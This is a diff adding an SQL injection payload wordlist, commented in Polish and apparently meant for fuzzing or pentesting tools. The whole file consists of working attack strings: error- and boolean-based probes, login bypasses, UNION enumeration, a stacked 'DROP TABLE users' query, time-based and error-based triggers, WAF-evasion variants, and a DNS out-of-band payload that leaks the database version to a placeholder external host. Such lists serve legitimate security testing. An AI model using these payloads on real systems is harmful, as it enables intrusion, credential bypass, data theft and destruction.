@@ -1,0 +1,69 @@
+# === Detection — error-based ===
+# Pojedynczy apostrof — najszybszy probe
+'
+"
+\
+;
+# Domknięcie nawiasu / komentarza
+')
+")
+'))
+';--
+'-- -
+
+# === Boolean-based truthy/falsy ===
+' OR '1'='1
+' OR '1'='1'-- -
+' OR 1=1-- -
+' AND '1'='2
+" OR "1"="1
+1 OR 1=1
+1) OR (1=1
+admin'-- -
+admin'#
+
+# === Authentication bypass ===
+' OR ''='
+' OR 1=1 LIMIT 1-- -
+admin' OR '1'='1'#
+' UNION SELECT 'admin','admin'-- -
+" OR ""="
+
+# === UNION SELECT detection ===
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL-- -
+' ORDER BY 1-- -
+' ORDER BY 100-- -
+' GROUP BY 1-- -
+
+# === Stacked queries ===
+'; DROP TABLE users-- -
+'; SELECT pg_sleep(5)-- -
+
+# === Generic error triggers ===
+'+convert(int,@@version)+'
+' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
+
+# === SQLi polyglots ===
+# Działa w wielu dialektach + WAF bypass
+SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
+# Klasyczny — wstrzyknięty w WHERE x = '$IN'
+') OR ('1'=('1
+# Multi-context (numeric + string + parenthesized)
+1' AND 1=1 UNION SELECT 1,2,3--+
+
+# === Whitespace bypass ===
+'/**/OR/**/'1'='1
+'%09OR%091=1-- -
+'%0AOR%0A1=1-- -
+
+# === Keyword bypass (UNION blocked) ===
+'+UnIoN+SeLeCt+1,2,3-- -
+'/*!UNION*/+/*!SELECT*/+1,2,3-- -
+
+# === Out-of-band trigger (DNS) ===
+# Wymagana podmiana {{OOB}}
+'; SELECT load_file(CONCAT('\\\\', (SELECT version()), '.{{OOB}}\\test'))-- -
